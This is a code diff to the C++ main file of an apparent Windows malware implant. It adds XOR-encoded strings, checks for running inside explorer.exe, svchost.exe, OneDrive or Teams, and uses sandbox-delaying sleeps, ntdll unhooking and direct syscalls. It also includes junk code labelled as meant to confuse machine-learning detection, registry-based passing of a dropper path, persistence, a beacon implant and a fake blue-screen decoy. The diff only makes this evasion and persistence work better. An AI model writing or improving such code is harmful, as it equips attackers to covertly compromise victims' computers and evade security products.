@@ -16,13 +16,20 @@
 #include <cwctype>
 
 namespace {
-    // Junk logic to confuse ML
+    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
+    std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";
+
+    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
+    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
+
+    // "DropperPath" -> \x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32
+    std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
+
     void ConfuseML() {
         std::vector<int> v = {1, 5, 2, 8, 3};
         std::sort(v.begin(), v.end());
-        int sum = 0;
+        volatile int sum = 0;
         for (int i : v) sum += i;
-        if (sum > 1000) LOG_DEBUG("Junk sort");
     }
 
     std::vector<uint8_t> GetSelfImage() {
@@ -31,6 +38,7 @@ namespace {
         HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile == INVALID_HANDLE_VALUE) return {};
         DWORD size = GetFileSize(hFile, NULL);
+        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
         std::vector<uint8_t> buffer(size);
         DWORD read;
         ReadFile(hFile, buffer.data(), size, &read, NULL);
@@ -43,8 +51,9 @@ namespace {
         GetModuleFileNameW(NULL, path, MAX_PATH);
         std::wstring sPath(path);
         std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
-        // "explorer.exe"
-        if (sPath.find(utils::DecryptW(L"\x3f\x22\x2a\x36\x35\x28\x3f\x22\x54\x31\x2c\x31")) != std::wstring::npos) return true;
+        if (sPath.find(utils::DecryptW(kExplorer)) != std::wstring::npos) return true;
+        // "svchost.exe" -> \x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F
+        if (sPath.find(utils::DecryptW(L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F")) != std::wstring::npos) return true;
         return false;
     }
 
@@ -54,6 +63,7 @@ namespace {
         std::wstring sPath(path);
         std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
         if (sPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos) return true;
+        if (sPath.find(L"\\microsoft\\teams\\") != std::wstring::npos) return true;
         if (sPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) return true;
         return false;
     }
@@ -63,7 +73,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
     ConfuseML();
-    Sleep(15000 + (GetTickCount() % 15000));
+    Sleep(10000 + (GetTickCount() % 15000));
 
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
@@ -72,18 +82,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (FAILED(hr)) return 1;
 
     if (IsSystemProcess()) {
-        // Use Volatile Environment for stealthy IPC
-        wchar_t dropperPath[MAX_PATH];
+        wchar_t dropperPath[MAX_PATH] = {0};
         HKEY hKey;
-        // "Volatile Environment"
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x1c\x35\x36\x3b\x2e\x33\x38\x3f\x1a\x1f\x34\x2c\x33\x28\x35\x34\x37\x3f\x34\x3e").c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        bool ipcSuccess = false;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD sz = sizeof(dropperPath);
-            // "DropperPath"
-            if (RegQueryValueExW(hKey, utils::DecryptW(L"\x0e\x28\x35\x2a\x2a\x3f\x28\x1a\x3b\x2e\x32").c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
-                Sleep(60000 + (GetTickCount() % 60000));
-                persistence::establishPersistence(dropperPath);
+            if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
+                ipcSuccess = true;
             }
             RegCloseKey(hKey);
+        }
+
+        if (ipcSuccess && dropperPath[0] != L'\0') {
+            Sleep(60000 + (GetTickCount() % 60000));
+            persistence::establishPersistence(dropperPath);
         }
 
         beacon::Beacon implant;
@@ -103,10 +115,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     wchar_t selfPath[MAX_PATH];
     GetModuleFileNameW(NULL, selfPath, MAX_PATH);
     HKEY hKey;
-    // "Volatile Environment"
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x1c\x35\x36\x3b\x2e\x33\x38\x3f\x1a\x1f\x34\x2c\x33\x28\x35\x34\x37\x3f\x34\x3e").c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        // "DropperPath"
-        RegSetValueExW(hKey, utils::DecryptW(L"\x0e\x28\x35\x2a\x2a\x3f\x28\x1a\x3b\x2e\x32").c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
     }
 
@@ -120,6 +130,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
+    // Fallback if injection fails
     persistence::establishPersistence();
     decoy::ShowBSOD();
     CoUninitialize();
